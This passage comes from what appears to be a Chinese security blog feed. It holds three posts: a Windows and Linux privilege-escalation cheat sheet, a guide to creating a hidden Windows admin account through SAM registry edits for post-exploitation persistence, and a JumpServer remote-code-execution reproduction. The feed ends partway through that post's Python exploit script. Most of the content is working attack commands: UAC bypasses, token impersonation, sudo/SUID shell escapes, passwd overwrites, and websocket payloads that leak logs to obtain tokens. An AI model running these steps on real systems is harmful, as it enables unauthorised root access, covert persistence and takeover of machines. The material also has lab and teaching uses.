Windows权限升级绕过UAC保护（通过Eventvwr注册表项）</span></span><br><span class="line">exploit/windows/<span class="built_in">local</span>/bypassuac_eventvwr</span><br><span class="line"><span class="comment"># Windows权限升级绕过UAC保护（通过COM处理程序劫持）</span></span><br><span class="line">exploit/windows/<span class="built_in">local</span>/bypassuac_comhijack</span><br><span class="line"></span><br><span class="line"><span class="comment">#Powershell</span></span><br><span class="line">Invoke-PsUACme</span><br><span class="line"></span><br><span class="line"><span class="comment">#Empire</span></span><br><span class="line">usemodule privesc/bypassuac</span><br><span class="line">usemodule privesc/bypassuac_wscript</span><br></pre></td></tr></table></figure><h4 id="5、令牌窃取"><a href="#5、令牌窃取" class="headerlink" title="5、令牌窃取"></a>5、令牌窃取</h4><p>令牌是系统的临时密钥，相当于账户名和密码，用来决定是否允许这次请求和判断这次请求是属于哪一个用户的，它允许你在不提供密码或其他凭证的前提下，访问网络和系统资源，这些令牌持续存在系统中，除非系统重新启动。</p><p>伪造令牌进行攻击的核心是利用Kerberos协议的漏洞。</p><p>通过MSF：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">use incognito</span><br><span class="line">list_tokens -u</span><br><span class="line">impersonate_token WIN-2HU3N1\\Administrator  <span class="comment">#注意：这里是两个反斜杠\\</span></span><br><span class="line">shell</span><br></pre></td></tr></table></figure><p>通过<a href="https://github.com/foxglovesec/RottenPotato.git" target="_blank" rel="noopener">烂土豆（Rotten potato）</a>提权【MS16-075】：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; use incognito</span><br><span class="line">meterpreter &gt; list_tokens -u</span><br><span class="line">meterpreter &gt; upload /root/Rottenpotato/rottenpotato.exe</span><br><span class="line">meterpreter &gt; execute -HC -f rottenpotato.exe</span><br><span class="line">meterpreter &gt; getuid</span><br></pre></td></tr></table></figure><h4 id="6、数据库提权"><a href="#6、数据库提权" class="headerlink" title="6、数据库提权"></a>6、数据库提权</h4><p>可参考：<a href="https://www.freebuf.com/articles/web/239338.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/239338.html</a></p><h5 id="Mysql提权、SQL-Server提权"><a href="#Mysql提权、SQL-Server提权" class="headerlink" title="Mysql提权、SQL Server提权"></a>Mysql提权、SQL Server提权</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">分类：功能型，技巧型，漏洞型</span><br><span class="line">功能型：udf提权</span><br><span class="line">技巧型：启动项提权</span><br><span class="line">漏洞型：mof提权</span><br></pre></td></tr></table></figure><h2 id="二、Linux提权"><a href="#二、Linux提权" class="headerlink" title="二、Linux提权"></a>二、Linux提权</h2><img src="/imgs/image-20210123134027171.png" alt="image-20210123134027171" style="zoom:50%;" /><h3 id="1、内核漏洞提权-1"><a href="#1、内核漏洞提权-1" class="headerlink" title="1、内核漏洞提权"></a>1、内核漏洞提权</h3><p>收集信息</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/*-release </span><br><span class="line">uname -a</span><br></pre></td></tr></table></figure><p>Seachsploit：根据内核信息查找漏洞</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">searchsploit linux 3.10 CentOS Linux 7</span><br></pre></td></tr></table></figure><p>linux-exploit-suggester</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/jondonas/linux-exploit-suggester-2/blob/master/linux-exploit-suggester-2.pl</span><br><span class="line">./linux-exploit-suggester-2.pl</span><br><span class="line">https://github.com/SecWiki/linux-kernel-exploits</span><br></pre></td></tr></table></figure><p>典型示例：脏牛漏洞（CVE-2016-5195）</p><h3 id="2、明文root密码提权"><a href="#2、明文root密码提权" class="headerlink" title="2、明文root密码提权"></a>2、明文root密码提权</h3><p>passwd 储存了用户，全用户可读，root 可写；</p><p>shadow 存储密码的 hash，仅 root 可读写</p><p>passwd 文件：daemon<code>:x:</code>1:1:daemon:/usr/sbin:/bin/sh </p><p>passwd 由冒号分割，第一列是用户名，第二列是密码，x 代表密码 hash 被放在 shadow 里面了（这样非 root 就看不到了）。而 shadow 里面最重要的就是密码的 hash。</p><h4 id="利用："><a href="#利用：" class="headerlink" title="利用："></a>利用：</h4><p> passwd、shadow 是否可写 </p><blockquote><p>ls -l passwd shadow </p></blockquote><p>1、passwd 可写</p><p>从上面图片里看到，passwd 文件是可写的，将 passwd 的 root 密码 X 替换为我们自己的 hash，如替换为自己 linux 里的 hash，可修改目标的 root 密码</p><p>2、shadow 可读</p><p>把 shadow 里面 root 的 hash 辅助出来，用 hash、john 爆破</p><h3 id="3、密码复用"><a href="#3、密码复用" class="headerlink" title="3、密码复用"></a>3、密码复用</h3><p>同一个密码可以被用在多个地方，比如数据库、web 后台密码 可能就是root的密码</p><h3 id="4、sudo滥用"><a href="#4、sudo滥用" class="headerlink" title="4、sudo滥用"></a>4、sudo滥用</h3><p><code>/etc/sudoers</code>文件定义可以执行 sudo 的账户、定义某个应用程序用 root 访问、是否需要密码验证。可以访问<a href="https://gtfobins.github.io/查看支持的命令" target="_blank" rel="noopener">https://gtfobins.github.io/查看支持的命令</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 查看当前用户可以sudo的程序</span></span><br><span class="line">sudo -l</span><br></pre></td></tr></table></figure><h4 id="SU"><a href="#SU" class="headerlink" title="SU:"></a>SU:</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo su</span><br></pre></td></tr></table></figure><p><img src="/imgs/image-20210127145327674.png" alt="image-20210127145327674"></p><h4 id="awk"><a href="#awk" class="headerlink" title="awk:"></a>awk:</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo awk <span class="string">'BEGIN &#123;system("/bin/sh")&#125;'</span></span><br></pre></td></tr></table></figure><p><img src="/imgs/image-20210127145146086.png" alt="image-20210127145146086"></p><h4 id="man"><a href="#man" class="headerlink" title="man:"></a>man:</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo man man</span><br><span class="line"><span class="comment"># 进入后 输入下面命令进入命令行</span></span><br><span class="line">!/bin/sh</span><br></pre></td></tr></table></figure><p><img src="/imgs/image-20210127145821823.png" alt="image-20210127145821823"></p><h3 id="5、su-root被禁止登录"><a href="#5、su-root被禁止登录" class="headerlink" title="5、su root被禁止登录"></a>5、su root被禁止登录</h3><h4 id="场景："><a href="#场景：" class="headerlink" title="场景："></a>场景：</h4><p>拿到 root 密码，端口转发，代理，但防护墙禁止其他人登录 root，在原来的低权限 shell，也无法 sudo 切换 root 。</p><h4 id="原因："><a href="#原因：" class="headerlink" title="原因："></a>原因：</h4><p>因为出于安全考虑，linux 要求用户必须从终端设备（tty）中输入密码，而不是标准输入（stdin）。 </p><p>所以 sudo 在你输入密码的时候本质上是读取了键盘，而不是读取 bash 里面输入的字符。 </p><h4 id="利用：-1"><a href="#利用：-1" class="headerlink" title="利用："></a>利用：</h4><p>python 语法:</p><blockquote><p>python -c ‘import pty;pty.spawn(“/bin/sh”)’ </p></blockquote><p>交互 shell，简单 shell 中直接按删除键是不行的，要按住 ctrl 键之后，再按住删除键才可以，其他键的使用也一样 </p><blockquote><p>$ sudo su</p></blockquote><h3 id="6、计划任务"><a href="#6、计划任务" class="headerlink" title="6、计划任务"></a>6、计划任务</h3><p>非 root 权限的用户是不可以列出 root 用户的计划任务的。但是 /etc/ 内系统的计划任务可以被列出，并且默认这些程序以 root 权限执行 </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls -l /etc/cron*</span><br></pre></td></tr></table></figure><p>如果定时任务里面有普通用户权限的定时任务，则可以修改定时任务的脚本来达到以root执行命令的目的。</p><h3 id="7、SUID"><a href="#7、SUID" class="headerlink" title="7、SUID"></a>7、SUID</h3><p>SUID 是一种特殊的文件属性，它允许用户执行的文件以该文件的拥有者的身份运行【ls 查看时有 s 属性才支持 SUID】，</p><p>如 passwd 文件，普通用户不能直接读写，但可通过 passwd 命令，以 root 权限修改 shadow（因为 shadow 是 root 权限文件，修改会以 root 权限修改）</p><h4 id="查找正在系统上运行的所有SUID可执行文件"><a href="#查找正在系统上运行的所有SUID可执行文件" class="headerlink" title="查找正在系统上运行的所有SUID可执行文件"></a>查找正在系统上运行的所有SUID可执行文件</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">find / -user root -perm -4000 -<span class="built_in">print</span> 2&gt;/dev/null</span><br><span class="line">find / -perm -u=s -<span class="built_in">type</span> f 2&gt;/dev/null</span><br></pre></td></tr></table></figure><h4 id="利用：-2"><a href="#利用：-2" class="headerlink" title="利用："></a>利用：</h4><p>提权思路：<br>某设置了suid的程序， 执行时可交互修改某文件或执行命令。那通过运行这个程序， 就获得了root权限。<br>vim<br>：set shell=/bin/sh<br>： shell</p><p><strong>比如发现了find</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#随便新建一个文件，或利用已有文件</span></span><br><span class="line">touch abc</span><br><span class="line"></span><br><span class="line"><span class="comment">#以SUID即root权限执行命令</span></span><br><span class="line">find abc -<span class="built_in">exec</span> whomai \;</span><br></pre></td></tr></table></figure><p><strong>nmap SUID提权</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#2.02 to 5.21版本 用交互模式执行shell命令</span></span><br><span class="line">sudo nmap --interactive</span><br><span class="line">nmap&gt; !sh</span><br></pre></td></tr></table></figure><h3 id="8、Docker逃逸"><a href="#8、Docker逃逸" class="headerlink" title="8、Docker逃逸"></a>8、Docker逃逸</h3><p>参考：<a href="https://www.freebuf.com/articles/system/170783.html，https://blog.csdn.net/qq_41874930/article/details/109216506，https://www.cnblogs.com/xiaozi/p/13423853.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/system/170783.html，https://blog.csdn.net/qq_41874930/article/details/109216506，https://www.cnblogs.com/xiaozi/p/13423853.html</a></p><p>判断是否在docker环境里：<code>ls -lah /.dockerenv</code></p><p>主要有以下几种提权方式：</p><p>配置不当引起的逃逸：</p><ul><li><p>Docker Remote API 未授权访问</p></li><li><p>docker.sock 挂载到容器内部</p></li><li><p>docker 高危启动参数</p></li><li><ul><li>privileged 特权模式</li><li>挂载敏感目录</li><li>相关启动参数存在的安全问题</li></ul></li></ul><p>Docker 软件设计引起的逃逸：</p><ul><li>Shocker攻击</li><li>runC容器逃逸漏洞(CVE-2019-5736)</li><li>Docker cp 命令(CVE-2019-14271)</li></ul><p>内核漏洞引起的逃逸：</p><ul><li>脏牛漏洞（dirtycow-docker-vdso）</li></ul><h2 id="参考链接："><a href="#参考链接：" class="headerlink" title="参考链接："></a>参考链接：</h2><p><a href="https://yoga7xm.top/2019/04/09/IPentest-admin/#Windows-Hash%E8%8E%B7%E5%8F%96" target="_blank" rel="noopener">https://yoga7xm.top/2019/04/09/IPentest-admin/#Windows-Hash%E8%8E%B7%E5%8F%96</a></p><p><a href="https://wiki.wgpsec.org/knowledge/hw/privilege.html#%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87" target="_blank" rel="noopener">https://wiki.wgpsec.org/knowledge/hw/privilege.html#%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87</a></p><p><a href="https://www.freebuf.com/articles/system/254836.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/system/254836.html</a></p><p><a href="https://www.cnblogs.com/-mo-/p/12718115.html" target="_blank" rel="noopener">https://www.cnblogs.com/-mo-/p/12718115.html</a></p><p><a href="https://cloud.tencent.com/developer/article/1544037" target="_blank" rel="noopener">https://cloud.tencent.com/developer/article/1544037</a></p><p><a href="https://www.freebuf.com/articles/web/239338.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/239338.html</a></p>]]></content>
      
      
      <categories>
          
          <category> 内网安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 内网安全 </tag>
            
            <tag> 提权 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>权限维持：Windows命令行下通过修改注册表创建隐藏帐号</title>
      <link href="2021/01/20/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%EF%BC%9AWindows%E5%91%BD%E4%BB%A4%E8%A1%8C%E4%B8%8B%E5%88%9B%E5%BB%BA%E9%9A%90%E8%97%8F%E5%B8%90%E5%8F%B7/"/>
      <url>2021/01/20/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%EF%BC%9AWindows%E5%91%BD%E4%BB%A4%E8%A1%8C%E4%B8%8B%E5%88%9B%E5%BB%BA%E9%9A%90%E8%97%8F%E5%B8%90%E5%8F%B7/</url>
      
        <content type="html"><![CDATA[<h4 id="场景："><a href="#场景：" class="headerlink" title="场景："></a>场景：</h4><p>后渗透<strong>在命令行</strong>下添加隐藏用户。</p><p>遇到一种情况：外网开了3389但是远程登录提示内部错误，查了下可能是用户远程桌面登录后断开没有注销导致，这时候就需要添加一个帐号来远程连接，又不想轻易被发现，所以就需要创建隐藏帐号（开机启动和控制面板都不能被发现）。网上查到的都是界面操作，命令行下的方法没找到，因此记录一下。</p><h4 id="原理："><a href="#原理：" class="headerlink" title="原理："></a>原理：</h4><p>SID：安全标识符（Security Identifiers），是标识用户、组和计算机账户的唯一的号码。</p><p>在注册表中有两处保存了帐号的SID，一是注册表HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users 下的子键名，另一处是该子键的子项F的值。但是Windows查询时用前者，登录时用的是后者，并且不同步两者。当用Administrator的F值覆盖其他帐号的F值后，帐号登录是管理员权限，但查询只会显示Administrator不会显示该帐号，因此可以创建隐藏帐号。</p><h4 id="实验环境："><a href="#实验环境：" class="headerlink" title="实验环境："></a>实验环境：</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">windows 7</span><br><span class="line">权限：system</span><br></pre></td></tr></table></figure><h4 id="命令行下操作方法"><a href="#命令行下操作方法" class="headerlink" title="命令行下操作方法"></a>命令行下操作方法</h4><h5 id="1、创建用户："><a href="#1、创建用户：" class="headerlink" title="1、创建用户："></a>1、创建用户：</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">net user test1$ test@123 &#x2F;add</span><br><span class="line">net localgroup administrators test1$ &#x2F;add</span><br></pre></td></tr></table></figure><p><img src="/imgs/image-20210118162416726.png" alt="image-20210118162416726"></p><p>因为加了$，命令行下看不到test1$用户</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net user</span><br></pre></td></tr></table></figure><p><img src="/imgs/image-20210118170352532.png" alt="image-20210118170352532"></p><p>但是控制面板还是可以看到用户</p><p><img src="/imgs/image-20210118170234490.png" alt="image-20210118170234490"></p><h5 id="2、查询注册表"><a href="#2、查询注册表" class="headerlink" title="2、查询注册表"></a>2、查询注册表</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg query HKLM\SAM\SAM\Domains\Account\Users\Names\test1$ &#x2F;ve</span><br></pre></td></tr></table></figure><p>查询结果显示如下</p><p><img src="/imgs/image-20210118163401311.png" alt="image-20210118163401311"></p><p>备注：如果是administrator权限，需要先给administrator加权。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># [1 8 17]表示赋予 administrator、everyone、system分别是完全控制、只读、完全控制权限</span><br><span class="line">echo HKLM\SAM\SAM\Domains\Account\Users [1 8 17] &gt;regini.ini</span><br><span class="line">regini regini.ini</span><br></pre></td></tr></table></figure><h5 id="3、导出新建用户的注册项"><a href="#3、导出新建用户的注册项" class="headerlink" title="3、导出新建用户的注册项"></a>3、导出新建用户的注册项</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">reg export HKLM\SAM\SAM\Domains\Account\Users\Names\test1$ C:\test1.reg</span><br><span class="line">type C:\test1.reg</span><br></pre></td></tr></table></figure><p>可以看到类型为3ea，十六进制补全000003ea</p><p><img src="/imgs/image-20210118164057486.png" alt="image-20210118164057486"></p><p>根据类型名称000003ea找到注册表项并导出</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">reg query HKLM\SAM\SAM\Domains\Account\Users\000003ea </span><br><span class="line">reg export HKLM\SAM\SAM\Domains\Account\Users\000003ea c:\3ea.reg</span><br></pre></td></tr></table></figure><p><img src="/imgs/image-20210118164512199.png" alt="image-20210118164512199"></p><h5 id="4、将administrator注册表导出"><a href="#4、将administrator注册表导出" class="headerlink" title="4、将administrator注册表导出"></a>4、将administrator注册表导出</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">默认administrator是000001f4</span><br><span class="line">reg export HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\000001f4 C:\admin.reg</span><br></pre></td></tr></table></figure><p><img src="/imgs/image-20210118165305029.png" alt="image-20210118165305029"></p><h5 id="5、修改注册文件"><a href="#5、修改注册文件" class="headerlink" title="5、修改注册文件"></a>5、修改注册文件</h5><p>下载3ea.reg到本地，修改3ea.reg的F值为admin的F值，然后在上传到目标机</p><p><img src="/imgs/image-20210118165829455.png" alt="image-20210118165829455"></p><h5 id="6、命令行下删除test1-用户"><a href="#6、命令行下删除test1-用户" class="headerlink" title="6、命令行下删除test1$用户"></a>6、命令行下删除test1$用户</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net user test1$ &#x2F;del</span><br></pre></td></tr></table></figure><p><img src="/imgs/image-20210118170539082.png" alt="image-20210118170539082"></p><h5 id="7、重新导入文件"><a href="#7、重新导入文件" class="headerlink" title="7、重新导入文件"></a>7、重新导入文件</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">regedit &#x2F;s c:\test1.reg</span><br><span class="line">regedit &#x2F;s c:\3ea.reg</span><br></pre></td></tr></table></figure><p>导入后 可以通过<code>net user test1$</code>查询到，但是<code>net user</code>和控制面板都看不到</p><p><img src="/imgs/image-20210118170844837.png" alt="image-20210118170844837"></p><p>界面操作可以参考<a href="https://blog.csdn.net/qq_33020901/article/details/78764816" target="_blank" rel="noopener">渗透技巧—Windows系统的帐户隐藏</a>。</p><h4 id="参考链接："><a href="#参考链接：" class="headerlink" title="参考链接："></a>参考链接：</h4><p><a href="https://blog.csdn.net/qq_33020901/article/details/78764816" target="_blank" rel="noopener">渗透技巧—Windows系统的帐户隐藏</a></p><p><a href="https://www.qingsword.com/qing/163.html" target="_blank" rel="noopener">使用Windows命令行reg控制注册表键值</a></p><p><a href="https://blog.csdn.net/weixin_33826268/article/details/92316569" target="_blank" rel="noopener">Regini修改注册表权限命令</a></p>]]></content>
      
      
      <categories>
          
          <category> 渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透 </tag>
            
            <tag> Windows </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JumpServer远程执行漏洞复现</title>
      <link href="2021/01/19/JumpServer%E8%BF%9C%E7%A8%8B%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
      <url>2021/01/19/JumpServer%E8%BF%9C%E7%A8%8B%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<h3 id="搭建环境："><a href="#搭建环境：" class="headerlink" title="搭建环境："></a>搭建环境：</h3><p>复现要求最低2核8G，找同事借了台centos虚拟机复现。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Centos7.7 8G 4核</span><br></pre></td></tr></table></figure><p>下载<a href="https://github.com/jumpserver/jumpserver/releases/download/v2.6.2/quick_start.sh" target="_blank" rel="noopener">脚本</a>安装JumpServer</p><p><img src="/imgs/image-20210119172033726.png" alt="image-20210119172033726"></p><p>因为安装成了2.6.2版本，切换到2.6.1版本</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.&#x2F;jmsctl.sh upgrade v2.6.1</span><br><span class="line">.&#x2F;jmsctl.sh restart</span><br></pre></td></tr></table></figure><p><img src="/imgs/image-20210119194637199.png" alt="image-20210119194637199"></p><p><img src="/imgs/image-20210119195012188.png" alt="image-20210119195012188"></p><h3 id="漏洞复现："><a href="#漏洞复现：" class="headerlink" title="漏洞复现："></a>漏洞复现：</h3><p>根据<a href="https://mp.weixin.qq.com/s/5q4cSlHUQ3NejkRg3vOWUA" target="_blank" rel="noopener">参考链接</a>，完整的rce利用步骤如下：</p><ol><li>未授权的情况下能够建立websocket连接</li><li>task可控，可以通过websocket对日志文件进行读取</li><li>拿到日志文件中的系统用户，用户，资产字段</li><li>通过3中的字段，可以拿到20s的token</li><li>通过该token能够进入koko的tty，执行命令</li></ol><p>1、首先需要添加资产并且在web终端打开，这一步是为了产生日志数据，因为下面连接服务器需要日志文件的系统用户、管理用户、资产字段</p><p><img src="/imgs/image-20210120141237947.png" alt="image-20210120141237947"></p><p>2、使用<a href="https://chrome.google.com/webstore/detail/websocket-test-client/fgponpodhbmadfljofbimhhlengambbn/related" target="_blank" rel="noopener">websocket工具</a>手动获取信息，获取一些task id</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ws:&#x2F;&#x2F;10.50.2.237:8080&#x2F;ws&#x2F;ops&#x2F;tasks&#x2F;log&#x2F;</span><br><span class="line">&#123;&quot;task&quot;:&quot;&#x2F;opt&#x2F;jumpserver&#x2F;logs&#x2F;jumpserver&quot;&#125;</span><br></pre></td></tr></table></figure><p><img src="/imgs/image-20210120104739136.png" alt="image-20210120104739136"></p><p>3、根据task id获取相关信息（可忽略）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ws:&#x2F;&#x2F;10.50.2.237:8080&#x2F;ws&#x2F;ops&#x2F;tasks&#x2F;log&#x2F;</span><br><span class="line">&#123;&quot;task&quot;:&quot;c5aad165-9893-4bee-8a52-eb808aa15f47&quot;&#125;</span><br></pre></td></tr></table></figure><p><img src="/imgs/image-20210120104909060.png" alt="image-20210120104909060"></p><p>4、获取以下信息  user、asset、system_user</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ws:&#x2F;&#x2F;10.50.2.237:8080&#x2F;ws&#x2F;ops&#x2F;tasks&#x2F;log&#x2F;</span><br><span class="line">&#123;&quot;task&quot;:&quot;&#x2F;opt&#x2F;jumpserver&#x2F;logs&#x2F;gunicorn&quot;&#125;</span><br><span class="line"></span><br><span class="line">asset_id&#x3D;b60c9792-a843-4b1b-935d-57134f3fca83&amp;system_user_id&#x3D;ae4b8369-5b69-4e42-941e-9f2f16686a05&amp;user_id&#x3D;452ce66e-87e9-41c2-bc92-b9c110780055</span><br></pre></td></tr></table></figure><p><img src="/imgs/image-20210120110623917.png" alt="image-20210120110623917"></p><p>5、通过user、asset、system_user利用<code>/api/v1/users/connection-token/</code>拿到一个token（20s），将token发给koko组件可以拿到一个ssh凭证，然后登录用户机器，所以最终执行的脚本是在堡垒机控制的机器而不是堡垒机本身，这个需要注意下。</p><p>替换里的user、asset、system_user然后执行<a href="https://mp.weixin.qq.com/s/5q4cSlHUQ3NejkRg3vOWUA" target="_blank" rel="noopener">脚本</a>，这里试了几个链接里面的脚本，虽然都连接成功但是不能执行命令，只有peiqi大佬的脚本我这里复现成功了。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> asyncio</span><br><span class="line"><span class="keyword">import</span> websockets</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">from</span> ws4py.client.threadedclient <span class="keyword">import</span> WebSocketClient</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">title</span><span class="params">()</span>:</span></span><br><span class="line">    print(<span class="string">'+------------------------------------------'</span>)</span><br><span class="line">    print(<span class="string">'+  \033[34mPOC_Des: http://wiki.peiqi.tech                                   \033[0m'</span>)</span><br><span class="line">    print(<span class="string">'+  \033[34mPOC_Des: https://www.o2oxy.cn/                                    \033[0m'</span>)</span><br><span class="line">    print(<span class="string">'+  \033[34mVersion: JumpServer &lt;= v2.6.1                                     \033[0m'</span>)</span><br><span class="line">    print(<span class="string">'+  \033[36m使用格式: python3 poc.py                                           \033[0m'</span>)</span><br><span class="line">    print(<span class="string">'+  \033[36mUrl         &gt;&gt;&gt; http://xxx.xxx.xxx.xxx                            \033[0m'</span>)</span><br><span class="line">    print(<span class="string">'+  \033[36mCmd         &gt;&gt;&gt; whoami                                    \033[0m'</span>)</span><br><span class="line">    print(<span class="string">'+------------------------------------------'</span>)</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ws_long</span><span class="params">(WebSocketClient)</span>:</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">opened</span><span class="params">(self)</span>:</span></span><br><span class="line">        req = <span 